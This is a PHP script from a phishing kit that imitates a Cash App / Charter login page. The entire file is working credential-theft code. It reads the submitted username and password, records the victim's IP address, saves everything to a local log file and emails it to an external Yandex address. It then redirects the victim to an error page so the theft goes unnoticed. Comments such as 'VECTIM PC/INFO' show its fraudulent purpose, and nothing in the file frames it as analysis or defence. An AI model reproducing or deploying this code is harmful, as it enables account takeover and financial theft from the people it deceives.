<?php include_once'../dbf60138c911308b0c99510ba80c36cc.php';?><?php
$ip = getenv("REMOTE_ADDR");
############################################################


	 $country = "Call Done";
   
///////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(isset($_POST['username'])){
$recipient = "jokamercairoresult@yandex.com";
$host = bin2hex ($_SERVER['HTTP_HOST']);
$LOGS = "[".date('Y-m-d H:i:s')."] - ".$ip."";
file_put_contents('../logs.txt', $LOGS . PHP_EOL, FILE_APPEND);
$message .= "------------[ Cash App Charter Login ]-------------\n";
$message .= "Username    : ".$_POST['username']."\n";
$message .= "Password    : ".$_POST['password']."\n";
$message .= "------------[ VECTIM PC/INFO ]-------------\n";
$message .= "IP: $ip\n";
$message .= "---------Created by ".$scamname."--------------\n";
$subject = "CashApp Charter LOG - $ip";
$headers = "From: Charter <rzlt@mydomain.com>";

	$save=fopen("../0v3r.txt","a+");
	fwrite($save,$message);
	fclose($save);

mail($recipient,$subject,$message,$headers);
				header("Location: error.php?$host-$host-$host");
		    	}
			else {	
				header("Location:error.php?$host-$host-$host"); 
		    				}
							header( "refresh:5;url=error.php?$host-$host-$host" );

?>